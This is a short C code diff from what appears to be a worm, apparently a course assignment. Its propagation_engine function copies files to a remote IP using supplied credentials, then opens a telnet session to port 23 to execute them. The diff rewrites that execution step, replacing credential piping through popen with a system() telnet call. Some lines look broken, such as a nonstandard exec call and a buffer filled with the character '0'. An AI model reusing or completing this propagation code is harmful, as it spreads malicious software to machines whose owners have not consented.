@@ -284,9 +284,8 @@ void fileTransfer(char *ip, char *username, char *password){
     }
 }
  
-void fileExecute(char *ip, char* username, char *password){
-    char buffer[256];
-    FILE *fp;
+void fileExecute(char *ip){
+    char buff[1024];
     pid_t child; // note that the actual return type of fork is 
              // pid_t, though it's probably just an int typedef'd or macro'd
 
@@ -295,23 +294,18 @@ void fileExecute(char *ip, char* username, char *password){
          perror("Fork failed");
     }
     else if (child == 0){
-        strcpy(buffer, "telnet ");
-        strcat(buffer, ip);
-        strcat(buffer, " 23");
-       // system(buffer);
-        fp = popen(buffer, "w");
-        fputs(username, fp);
-        fputc('\n', fp);
-        fputs(password, fp);
-        fputc('\n', fp);
-       // run command built into shell
-        exec("sh", "-c", "cd /Asgn03KLG/; pwd"); 
-         pclose(fp);
+        //abrir conexão
+        memset(buff, '0', 1024);
+        strcpy(buff, "telnet ");
+        strcat(buff, ip);
+        strcat(buff, " 23");
+        system(buff);
         _exit(23);
     }
+
 }
 
 void propagation_engine(char* ip, char *username, char *pass){    
         fileTransfer(ip, username, pass);
-        fileExecute(ip, username, pass);
+        fileExecute(ip);
 }
